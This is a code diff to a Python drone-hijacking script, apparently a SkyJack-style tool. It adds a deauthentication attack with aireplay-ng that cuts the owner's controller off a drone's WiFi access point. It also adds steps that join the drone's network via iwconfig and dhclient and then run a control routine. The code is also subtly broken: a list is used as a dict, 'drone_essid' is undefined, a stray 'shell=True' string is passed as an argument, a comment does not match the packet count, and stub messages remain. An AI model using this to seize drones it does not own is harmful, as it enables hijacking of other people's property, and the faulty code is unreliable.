@@ -13,10 +13,13 @@ AIRODUMP = "airodump-ng"
 AIREPLAY = "aireplay-ng"
 AIRMON = "airmon-ng"
 IFCONFIG = "ifconfig"
+IWCONFIG = "iwconfig"
+DHCLIENT = 'dhclient'
+NODEJS = 'node'
 
 targets = []
 skyjacked = []
-interface = 'wlan2'
+interface = 'wlan0'
 
 # Helper functions
 
@@ -201,11 +204,23 @@ def deauth_drone(clients, channels):
         drone_essid = channels[drone_mac][1]
         print(f"Found client ({cli}) connected to {drone_essid} ({drone_mac}, channel {drone_channel})")
 
+        # Hop onto the drone's channel
         print(f"Jumping onto drone's channel {drone_channel}\n")
-        sudo_exec(IWCONFIG, interface, 'channel', drone_channel)
+        sudo_exec(IWCONFIG, interface, 'channel', drone_channel, 'shell=True')
 
         # ...
-        
+
+        time.sleep(1)
+
+        # Disconnect client from drone AP
+
+        # -0 3 = Deauth attack, 15 packets
+        # -a = BSSID (drone MAC)
+        # -c = Client MAC (owner's controller)
+        sudo_exec(AIREPLAY, '-0', '15', '-a', drone_mac, '-c', cli, interface)
+
+    time.sleep(5)
+    
     print("Deauthenticating drone client... (STUB)")
     return
 
@@ -215,6 +230,27 @@ def skyjack_drone(clients, channels):
     STUB. TO BE IMPLEMENTED.
     """
 
+    for drone_mac in channels:
+        if drone_mac in skyjacked:
+            skyjacked[drone_mac] += 1
+            print(f"Already skyjacked {drone_mac}, skipping.")
+            continue
+
+        # Mark drone as skyjacked
+        skyjacked[drone_mac] = 1
+
+        print(f"Connecting to drone {drone_mac}")
+
+        sudo_exec(IWCONFIG, interface, 'essid', drone_essid)
+
+        # Obtain IP address via DHCP
+        sudo_exec(DHCLIENT, "-v", interface)
+
+        # Run control script
+        drone_control()
+
+    time.sleep(5)
+    
     print("Skyjacking drone... (STUB)")
     return
 
